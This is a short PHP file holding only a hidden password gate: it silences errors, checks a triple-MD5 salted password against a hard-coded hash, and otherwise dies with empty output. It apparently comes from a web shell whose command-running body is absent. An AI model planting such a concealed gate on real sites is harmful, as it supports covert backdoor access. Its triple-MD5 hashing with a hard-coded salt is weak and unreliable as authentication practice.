<?php
@session_start();
@set_time_limit(0); 
@error_reporting(0);
$salt = "silic1234";
$psw = trim($_POST['pass']);
$pass = $salt.$psw;
$pass = md5(md5(md5($pass)));
$chk_login = 1;
$password = "8f841a9b44b0167db6056389e0106af4";
if($pass == $password)
{
$_SESSION['ses'] = "$pass";
}
if($chk_login)
{
if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password)
{
die("");
}
}

exit;
?>